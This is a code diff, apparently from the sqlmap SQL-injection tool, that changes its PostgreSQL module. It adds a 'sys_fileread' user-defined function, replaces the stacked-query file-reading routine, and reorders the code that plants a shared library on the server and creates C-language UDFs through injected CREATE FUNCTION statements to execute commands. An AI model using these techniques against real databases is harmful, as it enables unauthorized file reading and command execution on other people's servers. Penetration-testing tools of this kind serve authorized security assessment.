@@ -61,19 +61,11 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
     def __init__(self):
         self.excludeDbsList = PGSQL_SYSTEM_DBS
         self.sysUdfs        = {
-                                # UDF name: UDF parameters' input data-type and return data-type
-                                "sys_exec":    {
-                                                 "input":  [ "text" ],
-                                                 "return": "int4"
-                                               },
-                                "sys_eval":    {
-                                                 "input":  [ "text" ],
-                                                 "return": "text"
-                                               },
-                                "sys_bineval": {
-                                                 "input":  [ "text" ],
-                                                 "return": "int4"
-                                               }
+                                # UDF name:     UDF parameters' input data-type and return data-type
+                                "sys_exec":     { "input":  [ "text" ], "return": "int4" },
+                                "sys_eval":     { "input":  [ "text" ], "return": "text" },
+                                "sys_bineval":  { "input":  [ "text" ], "return": "int4" },
+                                "sys_fileread": { "input":  [ "text" ], "return": "text" }
                               }
 
         Enumeration.__init__(self, "PostgreSQL")
@@ -301,40 +293,12 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
         raise sqlmapUnsupportedFeatureException, errMsg
 
     def stackedReadFile(self, rFile):
-        warnMsg  = "binary file read on PostgreSQL is not yet supported, "
-        warnMsg += "if the requested file is binary, its content will not "
-        warnMsg += "be retrieved"
-        logger.warn(warnMsg)
-
         infoMsg = "fetching file: '%s'" % rFile
         logger.info(infoMsg)
 
-        result = []
+        self.initEnv()
 
-        self.createSupportTbl(self.fileTblName, self.tblField, "bytea")
-
-        logger.debug("loading the content of file '%s' into support table" % rFile)
-        inject.goStacked("COPY %s(%s) FROM '%s'" % (self.fileTblName, self.tblField, rFile))
-
-        if kb.unionPosition:
-            result = inject.getValue("SELECT ENCODE(%s, 'base64') FROM %s" % (self.tblField, self.fileTblName), unpack=False, resumeValue=False, sort=False)
-
-        if not result:
-            result = []
-            count  = inject.getValue("SELECT COUNT(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=2)
-
-            if not count.isdigit() or not len(count) or count == "0":
-                errMsg  = "unable to retrieve the content of the "
-                errMsg += "file '%s'" % rFile
-                raise sqlmapNoneDataException, errMsg
-
-            indexRange = getRange(count)
-
-            for index in indexRange:
-                chunk = inject.getValue("SELECT ENCODE(%s, 'base64') FROM %s OFFSET %d LIMIT 1" % (self.tblField, self.fileTblName, index), unpack=False, resumeValue=False, sort=False)
-                result.append(chunk)
-
-        return result
+        return self.udfEvalCmd(cmd="'%s'" % rFile, udfName="sys_fileread")
 
     def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
         errMsg  = "PostgreSQL does not support file upload with UNION "
@@ -429,22 +393,7 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
             # read/write/execute access is valid
             self.udfRemoteFile = "/tmp/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
 
-    def udfCreateFromSharedLib(self, udf, inpRet):
-        if udf in self.udfToCreate:
-            logger.info("creating UDF '%s' from the binary UDF file" % udf)
-
-            inp = ", ".join(i for i in inpRet["input"])
-            ret = inpRet["return"]
-
-            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
-            inject.goStacked("DROP FUNCTION %s" % udf)
-            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))
-
-            self.createdUdf.add(udf)
-        else:
-            logger.debug("keeping existing UDF '%s' as requested" % udf)
-
-    def udfInjectCmd(self):
+    def udfSetLocalPaths(self):
         self.udfLocalFile     = paths.SQLMAP_UDF_PATH
         self.udfSharedLibName = "libsqlmapudf%s" % randomStr(lowercase=True)
 
@@ -469,8 +418,20 @@ class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeove
             self.udfLocalFile += "/postgresql/linux/%s/lib_postgresqludf_sys.so" % majorVer
             self.udfSharedLibExt = "so"
 
-        self.checkNeededUdfs()
-        self.udfInjectCore(self.sysUdfs)
+    def udfCreateFromSharedLib(self, udf, inpRet):
+        if udf in self.udfToCreate:
+            logger.info("creating UDF '%s' from the binary UDF file" % udf)
+
+            inp = ", ".join(i for i in inpRet["input"])
+            ret = inpRet["return"]
+
+            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
+            inject.goStacked("DROP FUNCTION %s" % udf)
+            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))
+
+            self.createdUdf.add(udf)
+        else:
+            logger.debug("keeping existing UDF '%s' as requested" % udf)
 
     def uncPathRequest(self):
         self.createSupportTbl(self.fileTblName, self.tblField, "text")
